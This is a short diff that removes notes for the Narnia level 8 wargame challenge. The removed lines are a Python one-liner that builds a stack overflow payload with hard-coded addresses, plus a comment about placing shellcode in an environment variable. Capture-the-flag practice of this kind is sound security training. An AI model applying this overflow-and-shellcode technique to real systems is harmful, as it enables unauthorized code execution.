@@ -1,5 +1,0 @@
-/narnia/narnia8 $(python3 -c "import sys, struct;
-sys.stdout.buffer.write(b'a'*20+struct.
-pack('<I', 0xffffd584)+b'a'*4 + struct.pack('<I', 0xffffd5c3))")
-
-put shellcode in env, and then manipulate input that this will work
